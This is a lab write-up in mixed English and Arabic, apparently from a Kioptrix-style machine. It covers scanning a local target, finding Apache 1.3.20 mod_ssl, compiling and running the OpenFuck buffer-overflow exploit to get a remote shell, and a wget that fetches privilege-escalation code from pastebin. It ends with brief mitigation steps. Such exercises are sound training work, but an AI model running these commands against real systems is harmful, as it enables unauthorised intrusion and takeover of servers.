@@ -1,0 +1,60 @@
+Markdown
+# Lvl1 - Apache 1.3.20 mod_ssl Remote Exploit (OpenFuck)
+
+**Target:** 192.168.91.157
+**Vulnerability:** CVE-2002-0082 / CVE-2002-0083 - Apache mod_ssl Buffer Overflow
+**Exploit:** OpenFuck.c (OpenFuckV2.c)
+
+### 1. Discovery & Enumeration
+```bash
+sudo arp-scan -l
+nmap -sV -Pn -n 192.168.91.157
+nikto -h http://192.168.91.157
+
+6 lines hidden
+Nmap result showed:
+Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+
+ده version قديم جدا ومعروف انه مصاب بثغرة خطيرة في mod_ssl.
+
+2. Vulnerability Analysis
+Bash
+searchsploit Apache 1.3.20
+searchsploit mod_ssl 2.8.4
+لقيت 3 نتائج مهمة:
+
+unix/remote/21671.c -> OpenFuck.c
+unix/remote/764.c -> OpenFuckV2.c
+الثغرة دي بتسمح بـ Remote Code Execution عن طريق buffer overflow في mod_ssl.
+
+3. Exploitation
+نزلت الاكسبلوت وجمعته:
+
+Bash
+gcc -o OpenFuck 764.c -lcrypto
+# او من github: https://github.com/heltonWernik/OpenFuck
+الاستخدام:
+./OpenFuck <target> <box> <ip> <port> -c <connections>
+
+الـ Box هو نوع النظام، وهنا بنستخدم 0x6b لانه Red-Hat Linux:
+
+Bash
+./OpenFuck 0x6b 192.168.91.157 443 -c 45
+بعد 45 محاولة:
+
+Code
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+قدرنا ندخل كـ apache وبعدها uid=0 لو الاكسبلوت اشتغل كـ root.
+
+حاولت اعمل privesc بـ ptrace-kmod:
+
+Bash
+wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c
+بس فشل عشان الماشين مفيهاش انترنت والـ gcc قديم (2.96).
+
+4. Mitigation
+تحديث Apache لاخر version
+تحديث OpenSSL
+ايقاف mod_ssl القديم
